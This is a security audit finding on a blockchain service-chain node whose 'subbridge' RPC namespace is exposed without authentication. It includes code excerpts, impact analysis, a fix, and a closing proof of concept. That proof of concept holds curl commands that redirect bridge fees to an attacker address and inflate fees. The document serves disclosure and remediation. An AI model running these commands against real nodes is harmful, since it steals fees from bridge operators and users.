### Title
`subbridge` Namespace Registered as `Public: true` Exposes Privileged Bridge Management Operations Without Authentication — (`File: node/sc/subbridge.go`)

### Summary

The `subbridge` RPC namespace is registered with `Public: true`, making the entire `SubBridgeAPI` — including `SetFeeReceiver`, `SetKLAYFee`, `SetERC20Fee`, `DeployBridge`, `DeregisterBridge`, and `UnlockParentOperator` — accessible over HTTP and WebSocket endpoints to any client that can reach the node, without any authentication. When the bridge operator account is unlocked (the normal operational state for a running bridge), an unauthenticated caller can redirect all bridge fees to an attacker-controlled address.

### Finding Description

In `node/sc/subbridge.go`, the `SubBridge.APIs()` method registers the entire `SubBridgeAPI` service under the `subbridge` namespace with `Public: true`:

```go
// node/sc/subbridge.go
func (sb *SubBridge) APIs() []rpc.API {
    return []rpc.API{
        {
            Namespace: "subbridge",
            Version:   "1.0",
            Service:   sb.APIBackend,
            Public:    true,   // <-- exposes ALL SubBridgeAPI methods over HTTP/WS
        },
        ...
    }
}
``` [1](#0-0) 

The `Public: true` flag is the gate used by `StartHTTPEndpoint` and `StartWSEndpoint` to decide which APIs to register on the public-facing listeners:

```go
// networks/rpc/endpoints.go
if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
    handler.RegisterName(api.Namespace, api.Service)
}
``` [2](#0-1) 

This means every method on `SubBridgeAPI` is reachable over HTTP/WS. The most impactful exposed methods are:

**`SetFeeReceiver`** — calls `BridgeManager.SetFeeReceiver`, which signs and submits an on-chain transaction using the bridge operator account to change the address that receives all bridge transfer fees:

```go
// node/sc/bridge_manager.go
func (bm *BridgeManager) SetFeeReceiver(bridgeAddr, receiver common.Address) (common.Hash, error) {
    ...
    tx, err := bi.bridge.SetFeeReceiver(auth.GenerateTransactOpts(), receiver)
    ...
}
``` [3](#0-2) 

**`SetKLAYFee` / `SetERC20Fee`** — similarly sign and submit on-chain transactions to change the fee amounts charged to bridge users. [4](#0-3) 

The bridge contract's `_payKLAYFeeAndRefundChange` and `_payERC20FeeAndRefundChange` functions transfer the fee directly to `feeReceiver` on every bridge request:

```solidity
// contracts/service_chain/bridge/BridgeFee.sol
if (feeReceiver != address(0) && fee > 0) {
    (bool ok, ) = feeReceiver.call.value(fee)("");
``` [5](#0-4) 

By contrast, the `personal` namespace (which also manages accounts) is correctly registered with `Public: false`:

```go
// node/cn/backend.go
{
    Namespace: "personal",
    Version:   "1.0",
    Service:   api.NewPersonalAPI(s.APIBackend, nonceLock),
    Public:    false,   // correctly restricted
},
``` [6](#0-5) 

### Impact Explanation

When the bridge operator account is unlocked — which is the normal operational state for a running service-chain bridge — any unauthenticated HTTP/WS client that can reach the node can:

1. Call `subbridge_setFeeReceiver` to redirect all KAIA and ERC20 bridge fees to an attacker-controlled address. Every subsequent bridge transfer by any user pays fees directly to the attacker.
2. Call `subbridge_setKLAYFee` / `subbridge_setERC20Fee` to inflate fees to the maximum, maximizing the drain.
3. Call `subbridge_lockParentOperator` or `subbridge_lockChildOperator` to halt bridge operations entirely.
4. Call `subbridge_deregisterBridge` to disrupt the bridge configuration.

The corrupted value is the `feeReceiver` storage slot in the deployed bridge contract, which is changed from the legitimate operator address to the attacker's address. All fee payments from that point forward are diverted.

### Likelihood Explanation

Service-chain nodes must expose their RPC endpoint for management. If the HTTP or WebSocket interface is bound to any interface other than `127.0.0.1` (e.g., `0.0.0.0` for remote management, which is common in cloud deployments), the `subbridge` namespace is reachable by any network peer. The operator account is unlocked during normal bridge operation. No credentials, special headers, or prior state are required — a single JSON-RPC call suffices.

### Recommendation

Change the `Public` flag for the `subbridge` namespace from `true` to `false` in `node/sc/subbridge.go`, or add `IPCOnly: true` to restrict it to the local IPC socket:

```go
func (sb *SubBridge) APIs() []rpc.API {
    return []rpc.API{
        {
            Namespace: "subbridge",
            Version:   "1.0",
            Service:   sb.APIBackend,
            Public:    false,  // restrict to IPC or authenticated channels only
        },
        ...
    }
}
```

This mirrors the treatment of the `personal` and `debug` namespaces, which are already marked `Public: false`. Operators who need remote access to `subbridge` management APIs should use authenticated reverse proxies or the IPC socket over an SSH tunnel.

### Proof of Concept

Precondition: a service-chain node (KSCN/KSEN) with HTTP RPC enabled and the bridge operator account unlocked (standard running state).

```bash
# 1. Discover registered bridge pairs
curl -s -X POST http://<node>:8551 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"subbridge_listBridge","params":[]}' \
  | jq '.result[0].childAddress'
# => "0xChildBridgeAddr"

# 2. Redirect all bridge fees to attacker address — no authentication required
curl -s -X POST http://<node>:8551 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","id":2,
    "method":"subbridge_setFeeReceiver",
    "params":["0xChildBridgeAddr","0xAttackerAddress"]
  }'
# => {"jsonrpc":"2.0","id":2,"result":"0x<txHash>"}

# 3. Optionally inflate the fee
curl -s -X POST http://<node>:8551 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","id":3,
    "method":"subbridge_setKLAYFee",
    "params":["0xChildBridgeAddr","0xDE0B6B3A7640000"]
  }'
```

From this point, every bridge value-transfer request pays the configured fee directly to `0xAttackerAddress` via the bridge contract's `_payKLAYFeeAndRefundChange` / `_payERC20FeeAndRefundChange` logic, with no further attacker interaction required.
